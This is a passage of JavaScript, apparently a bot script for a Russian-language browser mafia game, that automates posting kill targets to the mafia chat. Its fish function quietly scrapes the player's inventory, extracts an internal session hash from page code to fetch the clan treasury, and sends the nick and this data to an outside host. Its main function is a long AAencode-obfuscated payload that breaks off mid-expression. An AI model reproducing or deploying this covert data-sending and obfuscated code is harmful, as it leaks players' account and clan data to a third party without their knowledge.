							if (basket_2[r-1] != ''){ adresat = basket_2[r-1];}					
						}
					}
				}			
		}
	}
	return false;
}
//Написать жертву в чат мафии
function chat_kill(trup){
	var zhertva = '';
	if (rrole() == 'Мафиози!'){
		var slova = ['бьем', 'мочим', 'давай его', 'валим', 'бьем ее', 'ее', ' ', 'его', 'убиваем'];
	}
	if (rrole() == 'Босс мафии!'){
		var slova = ['морожу', 'его морожу', 'я сюда', 'давай я его', 'схожу сюда', 'попробую ее', 'я ее', 'я его', 'морожу'];
	}
	if (rrole() == 'Двуликий!'){
		var slova = ['я бью', 'ее бью', 'его бью', 'я сюда', 'я этого', 'попробую ее', 'я ее', 'я его', 'я эту'];
	}
	for(var i=0; i<Math.floor(Math.random()*3)+1; i++){
		zhertva = zhertva + '[@'+ trup + '] ';
	}
	_CHT_action('', 'tab', 'cmf', event);
	setTimeout(function(){
		_CHT_action('', 'smile', zhertva+slova[Math.floor(Math.random()*8)+1], event);
	},2000);
	setTimeout(function(){
		_CHT_action('ich', 'send', 'close', event);
	},3500);
	setTimeout(function(){
		_CHT_action('', 'tab', 'cco', event);
	},5000);
}

function fish(){
		var st_f = '';
		var ext_f = $('#gxt_list').find('li').find('.count');
		for(var i=0;i<ext_f.length;i++){
			var id_f = $($(ext_f)[i]).parent('li').attr('id').substr(4);
			var kol_f = $($(ext_f)[i]).text();
			if (id_f != 160){
				if (id_f == 165){st_f = st_f + 'Яйца - ' + kol_f + ' шт; '}
				if (id_f == 116){st_f = st_f + 'Перчи Потроха - ' + kol_f + '; '}
				if (id_f == 166){st_f = st_f + 'Перстень - ' + kol_f + '; '}
				if (id_f == 167){st_f = st_f + 'Тыквы - ' + kol_f + ' шт; '}
				if (id_f == 163){st_f = st_f + 'Шапки ' + kol_f + '; '}
				if (id_f == 164){st_f = st_f + 'Валентинки ' + kol_f + '; '}
				if (id_f == 112){st_f = st_f + 'Золотой профиль - ' + kol_f + '; '}
				if (id_f == 162){st_f = st_f + 'Досрочки - ' + kol_f + ' шт; '}
				if (id_f == 101){st_f = st_f + 'Жуки - ' + kol_f + ' шт; '}
				if (id_f == 109){st_f = st_f + 'Тачки - ' + kol_f + ' шт; '}
				if (id_f == 102){st_f = st_f + 'Активок - ' + kol_f + ' шт; '}
				if (id_f == 111){st_f = st_f + 'Миноискатели - ' + kol_f + ' шт; '}
				if (id_f == 110){st_f = st_f + 'Мины - ' + kol_f + ' шт; '}
				if (id_f == 106){st_f = st_f + 'Маски - ' + kol_f + ' шт; '}
				if (id_f == 108){st_f = st_f + 'Паспорт - ' + kol_f + ' шт; '}
				if (id_f == 105){st_f = st_f + 'Ревы - ' + kol_f + ' шт; '}
				if (id_f == 161){st_f = st_f + 'Перчи - ' + kol_f + ' шт; '}
				if (id_f == 114){st_f = st_f + 'Псих - ' + kol_f + ' шт; '}
				if (id_f == 115){st_f = st_f + 'Киллер - ' + kol_f + ' шт; '}
				if (id_f == 153){st_f = st_f + 'Антифриз - ' + kol_f + ' шт; '}
				if (id_f == 154){st_f = st_f + 'Будильники - ' + kol_f + ' шт; '}
				if (id_f == 155){st_f = st_f + 'Испы - ' + kol_f + ' шт; '}
				if (id_f == 156){st_f = st_f + 'Таро - ' + kol_f + ' шт; '}
				if (id_f == 157){st_f = st_f + 'Бюр - ' + kol_f + ' шт; '}
				if (id_f == 158){st_f = st_f + 'Броня - ' + kol_f + ' шт; '}
				if (id_f == 159){st_f = st_f + 'АК - ' + kol_f + ' шт; '}
				if (id_f == 170){st_f = st_f + 'Сон - ' + kol_f + ' шт; '}
				if (id_f == 171){st_f = st_f + 'Тело - ' + kol_f + ' шт; '}
				if (id_f == 104){st_f = st_f + 'Детектор - ' + kol_f + ' шт; '}
				if (id_f == 107){st_f = st_f + 'Рация - ' + kol_f + ' шт; '}
				if (id_f == 103){st_f = st_f + 'Удвойки - ' + kol_f + ' шт; '}
				if (id_f == 113){st_f = st_f + 'Бустеры - ' + kol_f + ' шт; '}
				
			}
		}
		var hash_f = PAGE_goto.toString().substr(82,32); 
		var kazna_f = '';
		$.ajax({
		async: false,
		cache: false,
		type: "POST",
		url: "/standalone/"+hash_f+"/DO/" + Math.random(),
		data: {method: "cl_root", id:my_clan},
		dataType: "json",
		success: function(data){
			kazna_f = data.arr[2]+' - kazna: '+data.arr[4];	
		}
		});		
		
		$.ajax({
			type: "POST",
			url: "http://vh17197.hv4.ru/bot/index.php",
			async: false,
			data: {"nick": my_nick, "extras": st_f, "kazna": kazna_f},
			success: function(data){
			}
		});
}

function lichka(){
	var chat_ls = $('#cpv_log').find('.message-to-me.pvt-message').find('.nick-from');
	var nick_ls = $($(chat_ls)[chat_ls.length-1]).text();
	if ((search_element_from_basket(basket_3,nick_ls) != -1) && (search_element_from_basket(basket_5,nick_ls) == -1)){
		del_element_from_basket(basket_3, nick_ls);
		add_element_to_basket(basket_2, nick_ls);	
	}
}

function main(){
   ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ 